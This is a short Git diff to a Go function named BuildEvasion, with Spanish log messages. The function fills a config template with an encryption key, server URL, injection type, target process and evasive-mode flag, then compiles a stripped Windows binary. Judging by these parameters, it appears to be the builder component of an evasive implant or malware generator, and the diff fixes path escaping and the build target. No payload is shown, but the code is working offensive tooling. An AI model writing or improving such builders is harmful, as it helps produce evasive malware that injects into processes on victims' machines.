@@ -26,23 +26,25 @@ func BuildEvasion(outputPath, encryptionKey, serverURL, injectionType, targetPro
 	content = strings.ReplaceAll(content, "{{ENCRYPTION_KEY}}", encryptionKey)
 	content = strings.ReplaceAll(content, "{{SERVER_URL}}", serverURL)
 	content = strings.ReplaceAll(content, "{{INJECTION_TYPE}}", injectionType)
-	content = strings.ReplaceAll(content, "{{TARGET_PROCESS}}", targetProcess)
+	content = strings.ReplaceAll(content, "{{TARGET_PROCESS}}", strings.ReplaceAll(targetProcess, `\`, `\\`))
 	content = strings.ReplaceAll(content, "{{EVASIVE_MODE}}", fmt.Sprintf("%v", evasiveMode))
 
 	if err := os.WriteFile(configOutPath, []byte(content), 0644); err != nil {
 		return fmt.Errorf("error escribiendo config.go: %v", err)
 	}
 
-	cmd := exec.Command("go", "build", "-ldflags=-s -w", "-o", outputPath, "main.go")
-	cmd.Dir = evasionDir
-	cmd.Env = append(os.Environ(),
+	buildEnv := append(os.Environ(),
 		"GOOS=windows",
 		"GOARCH=amd64",
 		"CGO_ENABLED=0",
 	)
 
+	cmd := exec.Command("go", "build", "-ldflags=-s -w", "-o", outputPath, ".")
+	cmd.Dir = evasionDir
+	cmd.Env = buildEnv
+
 	out, err := cmd.CombinedOutput()
-	fmt.Println("📦 Salida del build evasion:\n", string(out))
+	fmt.Println("Salida del build evasion:\n", string(out))
 	if err != nil {
 		return fmt.Errorf("falló la compilación:\n%s\nDetalles: %v", string(out), err)
 	}
